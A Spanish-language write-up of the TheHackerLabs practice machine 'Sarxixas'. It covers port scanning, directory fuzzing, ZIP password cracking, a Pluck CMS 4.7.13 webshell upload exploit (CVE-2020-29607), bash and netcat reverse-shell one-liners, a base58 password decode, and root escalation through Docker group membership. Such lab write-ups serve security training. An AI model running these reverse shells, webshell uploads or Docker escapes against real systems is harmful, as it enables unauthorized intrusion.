---
title: "Sarxixas - TheHackerLabs"
date: 2025-04-14
draft: false
slug: "THL-writeup-sarxixas"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que la página web activa en el puerto 80, está utilizando el CMS Pluck 4.7.13 y lo comprobamos con la herramienta whatweb, el login al que podemos entrar desde la página principal. Aplicando Fuzzing, descubrimos que hay un directorio que contiene un archivo ZIP, el cual descargamos y crackeamos para poder descomprimirlo. Adentro del archivo ZIP, encontramos la contraseña del usuario admin del CMS Pluck. Buscando un Exploit para la versión de Pluck, encontramos uno que permite subir una WebShell y lo aplicamos. Con la WebShell, obtenemos una Reverse Shell para tener una sesión de la máquina víctima. Enumerando la máquina, encontramos otro archivo ZIP, que crackeamos y descomprimimos, siendo que contiene un archivo de texto que muestra un hash desconocido. Utilizando CyberChef, identificamos y decodificamos el hash, siendo un hash en base58. Este hash es la contraseña de un usuario de la máquina víctima, lo que nos permite autenticarnos como este. Revisando los grupos a los que pertenece el usuario, descubrimos que está dentro del grupo de Docker, lo que nos permite abusar de Docker como Root y crear una montura completa de la máquina dentro de un contenedor, siendo así que escalamos privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "CMS Pluck", "Web Enumeration", "Fuzzing", "Cracking Hash", "Cracking ZIP", "File Upload Remote Code Execution (Authenticated)", "CVE-2020-29607", "Decoding Base58 Hash", "User Pivoting", "Abusing Docker Group", "Abusing Docker Binary", "Privesc - Abusing Docker Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "searchsploit"
  - "Python3"
  - "nc"
  - "Bash"
  - "wget"
  - "CyberChef"
  - "echo"
  - "base58"
  - "su"
  - "id"
  - "docker"
links:
  - "https://www.blackduck.com/blog/a-deep-dive-on-pluck-cms-vulnerability-cve-2023-25828.html"
  - "https://gchq.github.io/CyberChef/"
  - "https://gtfobins.github.io/gtfobins/docker/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-sarxixas/sarxixas.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.250
PING 192.168.1.250 (192.168.1.250) 56(84) bytes of data.
64 bytes from 192.168.1.250: icmp_seq=1 ttl=64 time=1.35 ms
64 bytes from 192.168.1.250: icmp_seq=2 ttl=64 time=0.749 ms
64 bytes from 192.168.1.250: icmp_seq=3 ttl=64 time=0.902 ms
64 bytes from 192.168.1.250: icmp_seq=4 ttl=64 time=0.891 ms

--- 192.168.1.250 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 0.749/0.972/1.347/0.224 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.250 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 13:10 CST
Initiating ARP Ping Scan at 13:10
Scanning 192.168.1.250 [1 port]
Completed ARP Ping Scan at 13:10, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:10
Scanning 192.168.1.250 [65535 ports]
Discovered open port 80/tcp on 192.168.1.250
Discovered open port 22/tcp on 192.168.1.250
Completed SYN Stealth Scan at 13:10, 8.50s elapsed (65535 total ports)
Nmap scan report for 192.168.1.250
Host is up, received arp-response (0.00087s latency).
Scanned at 2025-04-14 13:10:43 CST for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
           Raw packets sent: 69428 (3.055MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solo hay 2 puertos abiertos. Me da la impresión de que la intrusión será por la página web.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.250 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 13:11 CST
Nmap scan report for 192.168.1.250
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-generator: pluck 4.7.13
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-title: sarxixas - sarxixas
|_Requested resource was http://192.168.1.250/?file=sarxixas
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo obtuvo bastante información sobre la página web activa en el **puerto 80**.

Pues reporta que se está ocupando **Pluck 4.7.13** y 2 directorios que podemos visitar, así que vamos a visitar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura1.png">
</p>

Es raro, pero parece ser una publicación de un usuario.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura2.png">
</p>

No nos dice mucho, más que se está ocupando **PHP**.

Veamos qué información extra nos puede dar **whatweb**:
```bash
whatweb http://192.168.1.250
http://192.168.1.250 [302 Found] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.1.250], RedirectLocation[http://192.168.1.250/?file=sarxixas]
http://192.168.1.250/?file=sarxixas [200 OK] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.1.250], MetaGenerator[pluck 4.7.13], Pluck-CMS[4.7.13], Title[sarxixas - sarxixas]
```
Nos confirma el uso del **CMS Pluck Versión 4.7.13**.

Vamos a investigar qué es el **CMS Pluck**:

| **CMS Pluck** |
|:-----------:|
| *Pluck es un sistema de gestión de contenido escrito en PHP, que no necesita base de datos (usa archivos planos, como .txt), lo que lo hace ideal para servidores con pocos recursos o para quienes quieren evitar la complejidad de MySQL o similares.* |

Nos estamos enfrentando a otro CMS, por lo que, posiblemente, ya existan Exploits para la versión que se está ocupando en la máquina víctima.

Y observa que damos click al usuario admin, nos lleva al login de **Pluck**:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura3.png">
</p>

Pero no tenemos alguna contraseña.

Antes de buscar algún Exploit para la versión de **Pluck**, vamos a aplicar **Fuzzing** para ver si hay algo escondido por ahí.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.250/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.250/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000080:   301        9 L      28 W       316 Ch      "files"                                                                                                                      
000000002:   301        9 L      28 W       317 Ch      "images"                                                                                                                     
000000076:   301        9 L      28 W       315 Ch      "docs"                                                                                                                       
000001012:   301        9 L      28 W       314 Ch      "api"                                                                                                                        
000000168:   301        9 L      28 W       315 Ch      "data"                                                                                                                       
000045226:   302        0 L      0 W        0 Ch        "http://192.168.1.250/"                                                                                                     
000095510:   403        9 L      28 W       279 Ch      "server-status"                                                                                                              

Total time: 0
Processed Requests: 220545
Filtered Requests: 220538
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.250/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x txt,php,html -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.250/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> http://192.168.1.250/?file=sarxixas]
/images               (Status: 301) [Size: 317] [--> http://192.168.1.250/images/]
/files                (Status: 301) [Size: 316] [--> http://192.168.1.250/files/]
/docs                 (Status: 301) [Size: 315] [--> http://192.168.1.250/docs/]
/data                 (Status: 301) [Size: 315] [--> http://192.168.1.250/data/]
/admin.php            (Status: 200) [Size: 3758]
/api                  (Status: 301) [Size: 314] [--> http://192.168.1.250/api/]
/login.php            (Status: 200) [Size: 1247]
/robots.txt           (Status: 200) [Size: 47]
/requirements.php     (Status: 200) [Size: 3770]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 4740960 / 4740964 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones de archivos a buscar. |

Encontramos varios directorios, pero solamente encontremos dos cosas interesantes.

La primera la encontramos dentro del directorio `/docs`, pues ahí encontramos el **archivo CHANGES**, que contiene los cambios de las versiones de **Pluck** hasta la última versión que se está ocupando, que en este caso es la **4.7.13**:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura4.png">
</p>

Y lo que más llama la atención, es un **archivo ZIP** dentro del directorio `/api`:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura5.png">
</p>

Pero si lo descargamos y lo intentamos descomprimir, nos pedirá una contraseña que no tenemos:
```bash
unzip HostiaPilotes.zip
Archive:  HostiaPilotes.zip
   creating: HostiaPilotes/
[HostiaPilotes.zip] HostiaPilotes/contraseña.txt password:
```
Vamos a tratar de obtenerla.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeando Hash de Archivo ZIP y Ganando Acceso al Login de Pluck {#CrackHash}

Primero, vamos a obtener el hash del **archivo ZIP** con **zip2john**:
```bash
zip2john HostiaPilotes.zip > hash
ver 1.0 HostiaPilotes.zip/HostiaPilotes/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 HostiaPilotes.zip/HostiaPilotes/contraseña.txt PKZIP Encr: 2b chk, TS_chk, cmplen=31, decmplen=19, crc=DF1DBE40 ts=69C0 cs=69c0 type=0
```

Y ahora lo crackeamos con la herramienta **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babybaby         (HostiaPilotes.zip/HostiaPilotes/contraseña.txt)     
1g 0:00:00:00 DONE (2025-04-14 13:50) 6.666g/s 81920p/s 81920c/s 81920C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña del **archivo ZIP**.

Descomprimámoslo:
```bash
unzip HostiaPilotes.zip
Archive:  HostiaPilotes.zip
   creating: HostiaPilotes/
[HostiaPilotes.zip] HostiaPilotes/contraseña.txt password: 
 extracting: HostiaPilotes/contraseña.txt
```

Parece que contiene un archivo que tiene una contraseña:
```bash
cat HostiaPilotes/contraseña.txt
ElAbueloDeLaAnitta
```

Quizá sea la contraseña que necesitamos para entrar al login de **Pluck** como admin.

Probémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura6.png">
</p>

Estamos dentro.

### Probando Exploit: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) {#Exploit}

Buscando un Exploit con **searchsploit**, encontraremos uno justo para la versión de **Pluck 4.7.13**:
```bash
searchsploit pluck 4.7.13
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                                        | php/webapps/49909.py

|---|---|
Shellcodes: No Results
```

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
searchsploit -m php/webapps/49909.py
  Exploit: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49909
     Path: /usr/share/exploitdb/exploits/php/webapps/49909.py
    Codes: CVE-2020-29607
 Verified: True
File Type: ASCII text, with very long lines (18078)
```
Listo.

Analizando el Exploit, sube una **WebShell** llamada **shell.phar** que está hecha en **PHP** al directorio `/files`. La sube como el **usuario admin** y el Exploit necesita la IP del objetivo, el puerto, la contraseña del admin y el path que nos lleva a **Pluck**.

Lo único que nos faltaba era la contraseña del **usuario admin** y ya la tenemos.

Vamos a usar el Exploit:
```bash
python3 49909.py 192.168.1.250 80 ElAbueloDeLaAnitta /

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://192.168.1.250:80//files/shell.phar
```
Parece que funcionó.

Comprobemos si funciona la **WebShell**:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura7.png">
</p>

Excelente, ahora podemos obtener una **Reverse Shell** aplicándola desde aquí o puedes ocupar esta webshell para enumerar la máquina.

Si quieres obtener una sesión desde tu terminal, haz lo siguiente:

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Utiliza cualquiera de las siguientes **Reverse Shell**:
```bash
bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc Tu_IP puerto_random >/tmp/f
```

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.250] 57748
bash: cannot set terminal process group (442): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sarxixas:/var/www/html/files$
```
Genial.

Pero aún no podremos obtener la flag del usuario, aunque sí podemos identificar quién es el usuario de esta máquina si nos vamos al directorio `/home` y también revisando el `/etc/passwd`:
```bash
www-data@sarxixas:/var/www/html/files$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
sarxixa:x:1000:1002:concebolla,,,:/home/sarxixa:/bin/bash
www-data@sarxixas:/var/www/html/files$ cd /home
cd /home
www-data@sarxixas:/home$ ls
ls
sarxixa
```

## Post Explotación {#Post}

### Crackeando Segundo Archivo ZIP, Decodificando Hash de Base58 con CyberChef y Convirtiendonos en Usuario sarxixa {#CrackHash2}

Enumerando la máquina, encontraremos un **archivo ZIP** en el directorio `/opt`:
```bash
www-data@sarxixas:/opt$ ls
ls
edropedropedrooo.zip
```

Podemos descargarlo en nuestra máquina, abriendo un servidor con **Python3** usando el **puerto 8080**:
```bash
www-data@sarxixas:/opt$ python3 -m http.server 8080
```

Y desde nuestra máquina, lo descargamos con **wget**:
```bash
wget http://192.168.1.250:8080/edropedropedrooo.zip
--2025-04-14 14:39:54--  http://192.168.1.250:8080/edropedropedrooo.zip
Conectando con 192.168.1.250:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 242 [application/zip]
Grabando a: «edropedropedrooo.zip»

edropedropedrooo.zip    100%[====================>]     242  --.-KB/s    en 0.001s  

2025-04-14 14:39:54 (256 KB/s) - «edropedropedrooo.zip» guardado [242/242]
```

Tratemos de descomprimirlo:
```bash
unzip edropedropedrooo.zip
Archive:  edropedropedrooo.zip
[edropedropedrooo.zip] pedropedropedrooo.txt password: 
password incorrect--reenter:
```
Nos vuelve a pedir la contraseña.

Obtengamos el hash del **archivo ZIP** con **zip2john**:
```bash
zip2john edropedropedrooo.zip > hash2
ver 1.0 efh 5455 efh 7875 edropedropedrooo.zip/pedropedropedrooo.txt PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=D30B822E ts=8F24 cs=8f24 type=0
```

Lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cassandra        (edropedropedrooo.zip/pedropedropedrooo.txt)     
1g 0:00:00:00 DONE (2025-04-14 14:41) 33.33g/s 409600p/s 409600c/s 409600C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Y obtenemos la contraseña.

Descomprimámoslo:
```bash
unzip edropedropedrooo.zip
Archive:  edropedropedrooo.zip
[edropedropedrooo.zip] pedropedropedrooo.txt password: 
 extracting: pedropedropedrooo.txt
```

Tenemos un archivo de texto que contiene un hash un poco raro que no había visto antes:
```bash
cat pedropedropedrooo.txt
3HBRD7XyxF5gAbkMmnWdW
```
Si utilizamos **hashid y hash-identifier**, no podremos identificar de qué hash se trata y tampoco lo podremos identificar con páginas como **crackstation o dcode** e incluso **ChatGPT** no logroó identificarlo.

Para estos casos, podemos usar la página **CyberChef** que tiene muchas formas de codificar o decodificar distintos formatos de hash:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Para decodificar este hash, ocupé varios formatos, siendo que el de **base58** el que logró decodificarlo:

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura8.png">
</p>

Y como ya lo identificamos, podemos hacerlo desde nuestra máquina, usando la herramienta **base58**:
```bash
echo "3HBRD7XyxF5gAbkMmnWdW" | base58 -d
...
```
Parece ser una contraseña.

Pero al probarla con el **usuario sarxixa**, no va a funcionar.

Sin embargo, probando varias combinaciones de la contraseña y viendo que curiosamente al **archivo ZIP** le falta una letra, descubrimos que necesitamos eliminar la primera letra de la contraseña y así servirá para autenticarnos como el **usuario sarxixa**:
```bash
www-data@sarxixas:/home$ su sarxixa
Password: 
sarxixa@sarxixas:/home$ whoami
sarxixa
```

Bien, y aun así no podremos ver la flag del usuario, ya que le pertenece al **Root**:
```bash
sarxixa@sarxixas:~$ ls -la
total 28
drwx------ 3 sarxixa sarxixa 4096 abr 30  2024 .
drwxr-xr-x 3 root    root    4096 abr 30  2024 ..
lrwxrwxrwx 1 root    root       9 abr 30  2024 .bash_history -> /dev/null
-rw-r--r-- 1 sarxixa sarxixa  220 abr 12  2024 .bash_logout
-rw-r--r-- 1 sarxixa sarxixa 3526 abr 12  2024 .bashrc
drwxr-xr-x 3 sarxixa sarxixa 4096 abr 30  2024 .local
-rw-r--r-- 1 sarxixa sarxixa  807 abr 12  2024 .profile
-r-------- 1 root    root      33 abr 30  2024 user.txt
```

### Escalando Privilegios Abusando del Grupo Docker para Crear una Montura de la Máquina Víctima {#DockerPrivesc}

Revisando los privilegios de nuestro usuario, no tendremos ninguno y es más, parece que no existe el **comando sudo**:
```bash
sarxixa@sarxixas:~$ sudo -l
bash: sudo: orden no encontrada
```

Pero, si revisamos a qué grupos pertenecemos, encontraremos que estamos dentro del grupo de **Docker**:
```bash
sarxixa@sarxixas:~$ id
uid=1000(sarxixa) gid=1002(sarxixa) grupos=1002(sarxixa),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(docker)
```
Esto nos permite ejecutar **Docker** como si fuéramos **Root**.

Y tenemos una forma de aprovecharnos de esto en la guía de **GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins: docker</a>

<p align="center">
<img src="/assets/images/THL-writeup-sarxixas/Captura9.png">
</p>

Esto hará que podamos crear una montura completa de la máquina víctima dentro de un contenedor, lo que nos daría acceso a todos los archivos.

Hagámoslo:
```bash
sarxixa@sarxixas:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
f18232174bc9: Pull complete 
Digest: sha256:a8560b36e8b8210634f77d9f7f9efd7ffa463e380b75e2e74aff4511df3ef88c
Status: Downloaded newer image for alpine:latest
# whoami
root
```
Funcionó y automáticamente nos mete en el contenedor que acabamos de crear.

Busquemos y obtengamos las flags:
```bash
root@22b09c5d164e:/# cd root
root@22b09c5d164e:~# ls
root.txt
root@22b09c5d164e:~# cat root.txt
...
root@22b09c5d164e:~# cd /home/sarxixa/
root@22b09c5d164e:/home/sarxixa# ls
user.txt
root@22b09c5d164e:/home/sarxixa# cat user.txt
...
```
Y con esto, completamos la máquina.
